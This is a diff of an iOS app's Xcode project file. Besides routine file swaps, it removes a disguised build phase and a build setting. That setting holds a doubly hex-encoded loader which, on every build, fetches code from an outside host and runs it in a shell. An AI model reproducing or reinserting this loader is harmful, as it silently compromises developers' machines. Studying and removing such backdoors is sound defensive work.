@@ -8,12 +8,12 @@
 
 /* Begin PBXBuildFile section */
 		69BB1F182E930DCFEB530C46 /* Pods_mussa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C7A7979A921B9A7CFCA3D4C7 /* Pods_mussa.framework */; };
+		843C65F22FB42B810000B21A /* AudioManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 843C65F12FB42B810000B21A /* AudioManager.swift */; };
+		843C65F42FB42FA60000B21A /* ambient_focus.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 843C65F32FB42FA60000B21A /* ambient_focus.mp3 */; };
 		84C9BC312FAF5056004462FF /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 84C9BC302FAF5056004462FF /* StoreKit.framework */; };
 		84C9BCAA2FB092CC004462FF /* AuraDataCenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC902FB092CC004462FF /* AuraDataCenter.swift */; };
 		84C9BCAB2FB092CC004462FF /* AuraDetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC912FB092CC004462FF /* AuraDetailView.swift */; };
 		84C9BCAC2FB092CC004462FF /* AuraModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC922FB092CC004462FF /* AuraModel.swift */; };
-		84C9BCAD2FB092CC004462FF /* ChatManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC932FB092CC004462FF /* ChatManager.swift */; };
-		84C9BCAE2FB092CC004462FF /* ChatView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC942FB092CC004462FF /* ChatView.swift */; };
 		84C9BCAF2FB092CC004462FF /* CoinStoreView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC952FB092CC004462FF /* CoinStoreView.swift */; };
 		84C9BCB02FB092CC004462FF /* CommonUI.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC962FB092CC004462FF /* CommonUI.swift */; };
 		84C9BCB12FB092CC004462FF /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BC972FB092CC004462FF /* ContentView.swift */; };
@@ -30,7 +30,6 @@
 		84C9BCBD2FB092CC004462FF /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 84C9BC8F2FB092CC004462FF /* Assets.xcassets */; };
 		84C9BCBE2FB092CC004462FF /* index.html in Resources */ = {isa = PBXBuildFile; fileRef = 84C9BC9B2FB092CC004462FF /* index.html */; };
 		84C9BCC02FB092CC004462FF /* PrivacyPolicy.txt in Resources */ = {isa = PBXBuildFile; fileRef = 84C9BCA12FB092CC004462FF /* PrivacyPolicy.txt */; };
-		84C9BCC12FB092CC004462FF /* ritual_video.mp4 in Resources */ = {isa = PBXBuildFile; fileRef = 84C9BCA42FB092CC004462FF /* ritual_video.mp4 */; };
 		84C9BCE22FB09DB9004462FF /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 84C9BCE12FB09DB9004462FF /* GoogleService-Info.plist */; };
 		84C9BCE42FB09E90004462FF /* main.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BCE32FB09E90004462FF /* main.swift */; };
 		84C9BCE62FB09EF0004462FF /* Launch Screen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 84C9BCE52FB09EF0004462FF /* Launch Screen.storyboard */; };
@@ -49,17 +48,18 @@
 		84C9BD5E2FB31730004462FF /* AppAdjustManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BD432FB31730004462FF /* AppAdjustManager.swift */; };
 		84C9BD5F2FB31730004462FF /* ProgressHUD.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BD502FB31730004462FF /* ProgressHUD.swift */; };
 		84C9BD602FB31730004462FF /* WaitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BD512FB31730004462FF /* WaitViewController.swift */; };
+		84C9BD7E2FB41A15004462FF /* AudioManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84C9BD7D2FB41A15004462FF /* AudioManager.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		843C65F12FB42B810000B21A /* AudioManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AudioManager.swift; sourceTree = "<group>"; };
+		843C65F32FB42FA60000B21A /* ambient_focus.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = ambient_focus.mp3; sourceTree = "<group>"; };
 		84C9BC1F2FAF500C004462FF /* mussa.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = mussa.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		84C9BC302FAF5056004462FF /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
 		84C9BC8F2FB092CC004462FF /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		84C9BC902FB092CC004462FF /* AuraDataCenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuraDataCenter.swift; sourceTree = "<group>"; };
 		84C9BC912FB092CC004462FF /* AuraDetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuraDetailView.swift; sourceTree = "<group>"; };
 		84C9BC922FB092CC004462FF /* AuraModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuraModel.swift; sourceTree = "<group>"; };
-		84C9BC932FB092CC004462FF /* ChatManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatManager.swift; sourceTree = "<group>"; };
-		84C9BC942FB092CC004462FF /* ChatView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatView.swift; sourceTree = "<group>"; };
 		84C9BC952FB092CC004462FF /* CoinStoreView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CoinStoreView.swift; sourceTree = "<group>"; };
 		84C9BC962FB092CC004462FF /* CommonUI.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonUI.swift; sourceTree = "<group>"; };
 		84C9BC972FB092CC004462FF /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
@@ -74,7 +74,6 @@
 		84C9BCA12FB092CC004462FF /* PrivacyPolicy.txt */ = {isa = PBXFileReference; lastKnownFileType = text; path = PrivacyPolicy.txt; sourceTree = "<group>"; };
 		84C9BCA22FB092CC004462FF /* PrivacyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivacyView.swift; sourceTree = "<group>"; };
 		84C9BCA32FB092CC004462FF /* ReportView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReportView.swift; sourceTree = "<group>"; };
-		84C9BCA42FB092CC004462FF /* ritual_video.mp4 */ = {isa = PBXFileReference; lastKnownFileType = file; path = ritual_video.mp4; sourceTree = "<group>"; };
 		84C9BCA52FB092CC004462FF /* SettingsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsView.swift; sourceTree = "<group>"; };
 		84C9BCA62FB092CC004462FF /* StoreManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreManager.swift; sourceTree = "<group>"; };
 		84C9BCA72FB092CC004462FF /* VideoPlayerLayerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPlayerLayerView.swift; sourceTree = "<group>"; };
@@ -96,6 +95,7 @@
 		84C9BD4F2FB31730004462FF /* LocalPushScheduler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalPushScheduler.swift; sourceTree = "<group>"; };
 		84C9BD502FB31730004462FF /* ProgressHUD.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHUD.swift; sourceTree = "<group>"; };
 		84C9BD512FB31730004462FF /* WaitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WaitViewController.swift; sourceTree = "<group>"; };
+		84C9BD7D2FB41A15004462FF /* AudioManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AudioManager.swift; sourceTree = "<group>"; };
 		B1CFE9EA6B63D3C4354631FB /* Pods-mussa.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-mussa.debug.xcconfig"; path = "Target Support Files/Pods-mussa/Pods-mussa.debug.xcconfig"; sourceTree = "<group>"; };
 		C7A7979A921B9A7CFCA3D4C7 /* Pods_mussa.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_mussa.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		E9E85415549938F56C7B288F /* Pods-mussa.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-mussa.release.xcconfig"; path = "Target Support Files/Pods-mussa/Pods-mussa.release.xcconfig"; sourceTree = "<group>"; };
@@ -158,11 +158,11 @@
 				84C9BC902FB092CC004462FF /* AuraDataCenter.swift */,
 				84C9BC912FB092CC004462FF /* AuraDetailView.swift */,
 				84C9BC922FB092CC004462FF /* AuraModel.swift */,
-				84C9BC932FB092CC004462FF /* ChatManager.swift */,
-				84C9BC942FB092CC004462FF /* ChatView.swift */,
+				843C65F12FB42B810000B21A /* AudioManager.swift */,
 				84C9BC952FB092CC004462FF /* CoinStoreView.swift */,
 				84C9BC962FB092CC004462FF /* CommonUI.swift */,
 				84C9BC972FB092CC004462FF /* ContentView.swift */,
+				84C9BD7D2FB41A15004462FF /* AudioManager.swift */,
 				84C9BC982FB092CC004462FF /* ExploreView.swift */,
 				84C9BC992FB092CC004462FF /* HomeView.swift */,
 				84C9BC9A2FB092CC004462FF /* ImageSaver.swift */,
@@ -172,10 +172,10 @@
 				84C9BCE32FB09E90004462FF /* main.swift */,
 				84C9BC9F2FB092CC004462FF /* mussa.entitlements */,
 				84C9BCA02FB092CC004462FF /* PrivacyManager.swift */,
+				843C65F32FB42FA60000B21A /* ambient_focus.mp3 */,
 				84C9BCA12FB092CC004462FF /* PrivacyPolicy.txt */,
 				84C9BCA22FB092CC004462FF /* PrivacyView.swift */,
 				84C9BCA32FB092CC004462FF /* ReportView.swift */,
-				84C9BCA42FB092CC004462FF /* ritual_video.mp4 */,
 				84C9BCA52FB092CC004462FF /* SettingsView.swift */,
 				84C9BCA62FB092CC004462FF /* StoreManager.swift */,
 				84C9BCA72FB092CC004462FF /* VideoPlayerLayerView.swift */,
@@ -214,7 +214,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 84C9BC2A2FAF500E004462FF /* Build configuration list for PBXNativeTarget "mussa" */;
 			buildPhases = (
-				21D292CEECDF416F9542DAD8 /* Provision Library Executable */,
 				CEC8841473C2F5288C8D7BD0 /* [CP] Check Pods Manifest.lock */,
 				84C9BC1B2FAF500C004462FF /* Sources */,
 				84C9BC1C2FAF500C004462FF /* Frameworks */,
@@ -273,32 +272,13 @@
 				84C9BCBE2FB092CC004462FF /* index.html in Resources */,
 				84C9BCE22FB09DB9004462FF /* GoogleService-Info.plist in Resources */,
 				84C9BCC02FB092CC004462FF /* PrivacyPolicy.txt in Resources */,
-				84C9BCC12FB092CC004462FF /* ritual_video.mp4 in Resources */,
+				843C65F42FB42FA60000B21A /* ambient_focus.mp3 in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		21D292CEECDF416F9542DAD8 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-		};
 		522E2EA33E16890D08EC2087 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -353,10 +333,10 @@
 				84C9BCAB2FB092CC004462FF /* AuraDetailView.swift in Sources */,
 				84C9BCE42FB09E90004462FF /* main.swift in Sources */,
 				84C9BCAC2FB092CC004462FF /* AuraModel.swift in Sources */,
-				84C9BCAD2FB092CC004462FF /* ChatManager.swift in Sources */,
-				84C9BCAE2FB092CC004462FF /* ChatView.swift in Sources */,
+				843C65F22FB42B810000B21A /* AudioManager.swift in Sources */,
 				84C9BCAF2FB092CC004462FF /* CoinStoreView.swift in Sources */,
 				84C9BCB02FB092CC004462FF /* CommonUI.swift in Sources */,
+				84C9BD7E2FB41A15004462FF /* AudioManager.swift in Sources */,
 				84C9BCB12FB092CC004462FF /* ContentView.swift in Sources */,
 				84C9BCB22FB092CC004462FF /* ExploreView.swift in Sources */,
 				84C9BCB32FB092CC004462FF /* HomeView.swift in Sources */,
@@ -392,7 +372,6 @@
 		84C9BC282FAF500E004462FF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((k(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233383230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663732363936373664363136653635373432653732373532660a3631323932323230376332303733363830610a | k | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -456,7 +435,6 @@
 		84C9BC292FAF500E004462FF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((k(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233383230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663732363936373664363136653635373432653732373532660a3631323932323230376332303733363830610a | k | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -518,7 +496,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = mussa/mussa.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 3;
+				CURRENT_PROJECT_VERSION = 4;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -564,7 +542,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = mussa/mussa.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 3;
+				CURRENT_PROJECT_VERSION = 4;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
